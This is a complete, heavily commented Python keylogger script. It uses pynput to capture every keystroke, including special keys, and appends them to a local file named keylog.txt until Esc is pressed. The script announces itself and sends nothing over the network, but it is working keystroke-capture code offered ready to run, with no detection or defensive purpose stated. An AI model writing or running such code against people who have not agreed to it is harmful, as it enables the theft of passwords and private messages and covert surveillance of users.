# Import necessary modules from the pynput library
# pynput is a cross-platform library to control and monitor input devices.
# If you don't have pynput, install it using: pip install pynput
from pynput import keyboard

# Define the file where the keystrokes will be saved
LOG_FILE = "keylog.txt"

# List to store the pressed keys temporarily
keys = []

# Function to handle key press events
def on_press(key):
    """
    This function is called every time a key is pressed.
    It appends the key to the 'keys' list and writes it to the log file.
    """
    try:
        # For alphanumeric keys, get the character
        char = key.char
        # Special handling for space bar for better readability in the log
        if char == ' ':
            keys.append("[SPACE]")
        else:
            keys.append(char)
    except AttributeError:
        # For special keys (e.g., space, shift, ctrl), get the key name
        keys.append(f"[{str(key).replace('Key.', '').upper()}]")

    # Write the pressed key to the log file immediately
    # This ensures that even if the program crashes, some logs are saved.
    write_to_file(keys)
    # Clear the keys list after writing to avoid redundant entries on the next write
    keys.clear()

# Function to handle key release events
def on_release(key):
    """
    This function is called every time a key is released.
    It checks if the 'Esc' key was released to stop the keylogger.
    """
    if key == keyboard.Key.esc:
        # Stop listener if 'Esc' key is pressed
        print("\n[Keylogger stopped. Press Ctrl+C to exit.]")
        return False

# Function to write the collected keys to the log file
def write_to_file(key_list):
    """
    Writes the list of collected keys to the specified log file.
    Each key is written on a new line for clarity.
    """
    with open(LOG_FILE, "a") as f: # Open in append mode ('a')
        for key in key_list:
            # Ensure proper encoding for special characters if any, though not strictly needed for basic keys
            f.write(str(key) + '\n')

# Main part of the script
if __name__ == "__main__":
    print(f"[Starting Keylogger. Keystrokes will be saved to '{LOG_FILE}']")
    print("[Press 'Esc' to stop the keylogger.]")

    # Set up the listener
    # The 'on_press' function is called when a key is pressed.
    # The 'on_release' function is called when a key is released.
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # Join the thread to the main thread, so it keeps running
        # until the listener is stopped (e.g., by pressing 'Esc').
        listener.join()

